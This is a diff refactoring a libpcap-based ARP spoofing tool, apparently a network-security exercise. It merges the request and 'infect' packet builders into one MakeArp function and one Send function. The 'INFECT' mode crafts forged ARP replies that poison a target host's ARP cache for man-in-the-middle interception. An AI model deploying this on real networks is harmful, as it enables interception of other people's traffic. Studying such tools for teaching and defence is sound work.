@@ -49,44 +49,29 @@ void GetMyMac(char* dev, uint8_t *mac){
         memcpy(mac,ifr.ifr_hwaddr.sa_data,6);
 }
 
-EthArpPacket MakeArpRequest(uint32_t source_ip, uint8_t* source_mac, uint32_t target_ip){
+EthArpPacket MakeArp(int make_type ,uint32_t source_ip, uint8_t* source_mac, uint32_t target_ip, uint8_t* target_mac){
     EthArpPacket ARP;
+    if(make_type == INFECT){
+        memcpy(ARP.eth_.Dst_mac,target_mac,sizeof(uint8_t)*6);
+        memcpy(ARP.eth_.Src_mac,source_mac,sizeof(uint8_t)*6);
+        memcpy(ARP.arp_.Src_mac,source_mac,sizeof(uint8_t)*6);
+        memcpy(ARP.arp_.Tag_mac,target_mac,sizeof(uint8_t)*6);
+        ARP.arp_.Opcode = htons(REPLY);
+    }
+    else if (make_type == REQUEST){
+        memset(ARP.eth_.Dst_mac, 0xFF, 6);
+        memcpy(ARP.eth_.Src_mac,source_mac,sizeof(uint8_t)*6);
+        memcpy(ARP.arp_.Src_mac,source_mac,sizeof(uint8_t)*6);
+        memset(ARP.arp_.Tag_mac, 0x00, 6);
+        ARP.arp_.Opcode = htons(REQUEST);
+    }
 
-    memset(ARP.eth_.Dst_mac, 0xFF, 6);
-    memcpy(ARP.eth_.Src_mac,source_mac,sizeof(uint8_t)*6);
     ARP.eth_.type = htons(Arp);
-
     ARP.arp_.Hw_type = htons(ETHER);
     ARP.arp_.Proto_type = htons(Ip4);
     ARP.arp_.Hw_addr_len = 0x06;
     ARP.arp_.Proto_addr_len = 0x04;
-    ARP.arp_.Opcode = htons(REQUEST);
-
-    memcpy(ARP.arp_.Src_mac,source_mac,sizeof(uint8_t)*6);
     ARP.arp_.Src_ip = htonl(source_ip);
-
-    memset(ARP.arp_.Tag_mac, 0x00, 6);
-    ARP.arp_.Tag_ip = htonl(target_ip);
-
-    return ARP;
-}
-
-EthArpPacket MakeArpInfect(uint32_t gateway_ip, uint8_t* source_mac, uint32_t target_ip, uint8_t* target_mac){
-    EthArpPacket ARP;
-
-    memcpy(ARP.eth_.Dst_mac,target_mac,sizeof(uint8_t)*6);
-    memcpy(ARP.eth_.Src_mac,source_mac,sizeof(uint8_t)*6);
-    ARP.eth_.type = htons(Arp);
-
-    ARP.arp_.Hw_type = htons(ETHER);
-    ARP.arp_.Proto_type = htons(Ip4);
-    ARP.arp_.Hw_addr_len = 0x06;
-    ARP.arp_.Proto_addr_len = 0x04;
-    ARP.arp_.Opcode = htons(REPLY);
-
-    memcpy(ARP.arp_.Src_mac,source_mac,sizeof(uint8_t)*6);
-    ARP.arp_.Src_ip = htonl(gateway_ip);
-    memcpy(ARP.arp_.Tag_mac,target_mac,sizeof(uint8_t)*6);
     ARP.arp_.Tag_ip = htonl(target_ip);
 
     return ARP;
@@ -115,21 +100,13 @@ void CapArpReply(pcap_t* handle, uint32_t target_ip, uint8_t* target_mac){
     }
 }
 
-void SendRequest(pcap_t* handle, uint32_t source_ip, uint8_t* source_mac, uint32_t target_ip, uint8_t* target_mac){
-    EthArpPacket ARP = MakeArpRequest(source_ip, source_mac, target_ip);
+void Send(int make_type, pcap_t* handle, uint32_t source_ip, uint8_t* source_mac, uint32_t target_ip, uint8_t* target_mac){
+    EthArpPacket ARP = MakeArp(make_type, source_ip, source_mac, target_ip,target_mac);
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ARP), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
-    CapArpReply(handle, target_ip, target_mac);
-}
-
-void SendInfect(pcap_t* handle, uint8_t* source_mac, uint32_t target_ip, uint8_t* target_mac, uint32_t gateway_ip){
-    EthArpPacket ARP = MakeArpInfect(gateway_ip, source_mac, target_ip, target_mac);
-
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ARP), sizeof(EthArpPacket));
-    if (res != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-    }
+    if (make_type == REQUEST)
+        CapArpReply(handle, target_ip, target_mac);
 }
